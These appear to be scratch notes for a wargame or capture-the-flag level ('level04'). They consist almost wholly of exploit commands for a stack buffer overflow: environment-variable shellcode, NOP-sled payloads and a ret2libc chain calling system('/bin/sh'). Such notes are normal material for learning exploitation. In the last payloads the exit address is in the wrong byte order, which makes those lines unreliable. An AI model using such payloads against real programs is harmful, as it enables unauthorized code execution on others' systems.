saved eip 0xf7e45513

info variable environ

export SHELLCODE=`python -c 'print "\x31\xc0\xb0\x01\x31\xdb\xcd\x80"'`
0xffffd84c
0xffffd862
(python -c 'print "\x90"*156 + "\x4c\xd8\xff\xff"') | ./level04

r < <(python -c 'print "A"*156 + "\x4c\xd8\xff\xff"')

gcc -m32 -o get_env_addr get_env_addr.c
set follow-fork-mode child

# On recule de 32 bytes pour être sûr de tomber dans le NOP sled
(python -c 'print "\x90"*156 + "\x2c\xd8\xff\xff"') | ./level04


0xf7 f8 97 ec bin/sh
0xf7 e6 ae d0 system
0xf7 e5 eb 70 exit

ret2lib
 
(python -c 'print "\x90"*156 + "\xd0\xae\xe6\xf7" + "\xf7\xe5\xeb\x70" + "\xec\x97\xf8\xf7"'; cat) | ./level04

r < <(python -c 'print "\x90"*156 + "\xd0\xae\xe6\xf7" + "\xf7\xe5\xeb\x70" + "\xec\x97\xf8\xf7"')
